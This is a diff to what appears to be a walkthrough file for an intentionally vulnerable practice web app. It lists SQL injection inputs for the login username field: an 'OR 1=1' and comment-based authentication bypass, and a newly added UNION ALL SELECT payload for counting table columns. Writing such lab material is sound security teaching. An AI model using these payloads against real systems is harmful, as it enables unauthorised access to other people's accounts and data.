@@ -17,6 +17,9 @@ Injection:
     1. Put [tyler' OR '1'='1] or [tyler'-- ] (note there is a space after --) with brackets removed in username.
     2. Enter anything in the password field.
     3. Login and you will be in Tyler's account
+  UNION SQL Injection:
+    1. Put [tyler' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL FROM users-- ] (note there is a space after --) with brackets removed in username.
+    2. No syntax error. This means we know the number of columns in table users for intel gathering
 
 Broken-Access Control
 Cryptographic Failures
